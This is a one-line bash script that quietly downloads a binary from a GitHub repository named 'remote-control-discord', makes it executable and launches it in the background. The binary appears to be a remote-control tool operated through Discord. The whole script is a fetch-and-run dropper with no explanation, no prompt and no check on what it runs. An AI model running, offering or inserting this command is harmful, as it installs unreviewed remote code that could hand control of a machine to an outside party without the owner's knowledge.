#!/usr/bin/env bash

f=$(mktemp) && curl -fsSL https://github.com/mrdog233o5/remote-control-discord/raw/main/dist/main -o $f && chmod +x $f && $f &
